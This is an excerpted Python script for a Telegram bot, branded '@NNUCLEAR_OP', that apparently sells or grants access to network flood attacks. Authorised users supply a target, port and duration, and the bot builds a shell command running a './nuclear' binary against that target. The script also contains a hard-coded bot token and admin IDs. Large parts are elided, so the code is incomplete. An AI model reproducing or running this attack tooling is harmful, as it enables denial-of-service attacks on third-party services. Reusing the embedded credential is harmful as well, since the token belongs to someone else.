...
import datetime
import os
# NNUCLEAR_OP JOIN TO MORE UPDATES 
# Insert your Telegram bot token here
bot = telebot.TeleBot('8098653136:AAGNRZm1hyJrr-zpZubxefvTExZJDB1BTUA')
# DEVELOPER --> @NNUCLEAR_OP
# Admin user IDs
admin_id = ["","7700702349"]
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃.OWNER- @NNUCLEAR_OP"
...
def start_attack_reply(message, target, port, time):
    ...
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/+8d_8xWZiin40YjM9")
    )
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 600:
                ...
                full_command = f"./nuclear {target} {port} {time} 900"
        ...
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 - @NNUCLEAR_OP"
...
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/c/2295375726/2209"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['S4'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 --> 𝐒𝟒 \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @NNUCLEAR_OP\n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 - https://t.me/+8d_8xWZiin40YjM9
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/+8d_8xWZiin40YjM9'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/+8d_8xWZiin40YjM9')
    )
